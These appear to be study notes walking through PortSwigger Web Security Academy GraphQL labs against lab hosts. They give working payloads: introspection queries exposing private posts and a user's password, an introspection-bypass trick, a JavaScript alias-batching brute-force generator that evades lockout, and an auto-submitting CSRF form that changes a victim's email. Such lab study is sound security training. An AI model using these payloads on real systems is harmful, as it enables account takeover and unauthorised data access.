# Navigation
- [Accessing private GraphQL posts](#accessing-private-graphql-posts)
- [Accidental exposure of private GraphQL fields](#accidental-exposure-of-private-graphql-fields)
- [Finding a hidden GraphQL endpoint](#finding-a-hidden-graphql-endpoint)
- [Bypassing GraphQL brute force protections](#bypassing-graphql-brute-force-protections)
- [Performing CSRF exploits over GraphQL](#performing-csrf-exploits-over-graphql)
# Accessing private GraphQL posts
- Find hidden post and enter the password
1. Navigate application
2. See there is a POST request to a graphql endpoint
3. Send the request to repeater
4. Right-click > Graphql > Set introspection query
	1. We get introspection on the endpoint
5. Right-click the response > Graphql > Save graphql queries
6. Go to the target tab and look at the different queries we can perform
7. There is a query to get a blog post by its ID number (i.e. 1,2,3,4,5...)
	1. Each query returns a property from the blog post indicating if it is private or note (`"isPrivate":false`)
8. Send this request to intruder
```
{"query":"query($id: Int!) {\n  getBlogPost(id: $id) {\n    id\n    image\n    title\n    author\n    date\n    summary\n    paragraphs\n    isPrivate\n    postPassword\n  }\n}","variables":{"id":<payload-marker-here>}}
```
- Configure the following
	- Attack type: Sniper
	- Payload type: Numbers (0-20)
	- Configure a Grep - Extract rule to retrieve the `"isPrivate":false`) value returned from all requests
9. Begin attack
10. Look at the results and see there is one post with `"isPrivate":true`
11. Copy password
# Accidental exposure of private GraphQL fields
- Sign in as admin and delete Carlos
1. Navigate application
2. See there is a POST request to a graphql endpoint
3. Send the request to repeater
4. Right-click > Graphql > Set introspection query
	1. We get introspection on the endpoint
5. Right-click the response > Graphql > Save graphql queries
6. Go to the target tab and look at the different queries we can perform
7. There is a query to get a user and it includes their password
```
{"query":"query($id: Int!) {\n  getUser(id: $id) {\n    id\n    username\n    password\n  }\n}","variables":{"id":1}}
```
8. Send this to repeater, providing `"id":1` returns administrator and their password
9. Sign in as administrator
# Finding a hidden GraphQL endpoint
- Find hidden graphql endpoint
- Delete Carlos
1. Discover content using `ffuf`
	1. Use the basic graphql endpoints wordlist from resources
```sh
ffuf -u https://0af0001703cf6e2a80d84987005300c0.web-security-academy.netFUZZ -w graphql.txt -mc all
```
- We are matching all codes and looking at the differences in response size
```
/graphql/graphql        [Status: 404, Size: 11, Words: 2, Lines: 1, Duration: 348ms]
/graphql/api            [Status: 404, Size: 11, Words: 2, Lines: 1, Duration: 351ms]
/graphql                [Status: 404, Size: 11, Words: 2, Lines: 1, Duration: 356ms]
/api/graphql            [Status: 404, Size: 11, Words: 2, Lines: 1, Duration: 357ms]
/api                    [Status: 400, Size: 19, Words: 3, Lines: 1, Duration: 363ms]
:: Progress: [5/5] :: Job [1/1] :: 178 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```
- See that `/api` returns a 400 status code and is a different size to the rest
2. Performing GET request on `/api` tells us "Query not present" in the HTTP response
3. Probe with a graphql query
	1. Even in the GET request add a `Content-Type: application/json`
```json
    {
        "query": "{__schema{queryType{name}}}"
    }
```
- Response tells us that Introspection is not allowed
4. Test introspection bypasses
5. Right-click > Graphql > Set introspection query
6. Place a newline after the `__schema` to it becomes `__schema\n`
7. We get successful introspection query
8. Right-click the response > Graphql > Save graphql queries to sitemap
9. Checking the sitemap there is a mutation to delete users based on the `id` value that is given
10. Change this value incrementally until we delete Carlos (which is `"id":3`) in this case
# Bypassing GraphQL brute force protections
- Brute force Carlos
1. Login to the page using `wiener:peter` and see the request is a POST request to a graphql endpoint
2. Under the hood, we see a mutation query that returns a login token and tells us `"success:true"`
3. Attempting a normal brute force against Carlos triggers and account lockout
4. Using the following JavaScript, we can create a list of alias queries to bypass the brute force mechanism try all of these against Carlos
```js
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```
5. Open console > Paste the above JS > The aliases are saved to clipboard
6. Send the login request to repeater
7. Select the GraphQL tab and remove all data
8. In the Query box add the following, then paste the queries inside
```
mutation{
<paste-here>
}
```
9. Send the request and check the HTTP response for a `"success:true"` message
10. Copy the associated token value and replace your session cookie in the browser
# Performing CSRF exploits over GraphQL
- Change the victim's email address
1. Authenticate
2. Change email and notice GraphQL mutation being made to update the email address
3. Trying to change method to GET does not work, we get 405 Method Not Allowed
4. Changing the content type to `application/x-www-form-urlencoded` does work however
5. Construct a valid POST body by doing the following
6. GraphQL tab in Repeater > Copy **only** the "Query" section and paste it somewhere to edit it
	1. Replace all the new lines with spaces
7. Copy **only** the "Variables" section and paste it somewhere to edit it
	1. Replace all the new lines with spaces
8. Go to [URL Encode and Decode - Online](https://www.urlencoder.org/)
	1. URL encode each payload you made **separately**
9. Construct a POST body or GET params like so:
```
query=<encoded-query>&variables=<encoded-variables>
```
10. Send the request and confirm that it works
11. Construct a CSRF POST attack, but this time **do not use the URL encoded values**
```html
<html>
	<body>
		<form action="https://0afa00710456b60181ba618d002f00fd.web-security-academy.net/graphql/v1" method="POST">
			<input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }" />
			<input type="hidden" name="variables" value='{"input":{"email":"test2@test.com"}}' />
		</form>
		<script>
			document.forms[0].submit();
		</script>
	<body>
</html>
```
